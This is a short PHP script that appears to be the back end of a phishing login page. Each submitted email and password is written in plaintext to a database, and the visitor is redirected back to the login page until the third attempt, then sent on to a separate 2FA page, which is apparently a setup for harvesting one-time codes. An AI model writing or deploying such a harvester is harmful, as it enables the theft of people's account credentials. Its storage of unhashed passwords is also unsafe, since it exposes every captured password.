<?php
session_start();
include 'db.php';

$email = $_POST['email'];
$password = $_POST['password'];

$stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
$stmt->bind_param("ss", $email, $password);
$stmt->execute();

if (!isset($_SESSION['login_attempt'])) {
  $_SESSION['login_attempt'] = 1;
} else {
  $_SESSION['login_attempt']++;
}

if ($_SESSION['login_attempt'] >= 3) {
  header("Location: twofa.html");
  exit();
} else {
  header("Location: index.html");
  exit();
}
?>
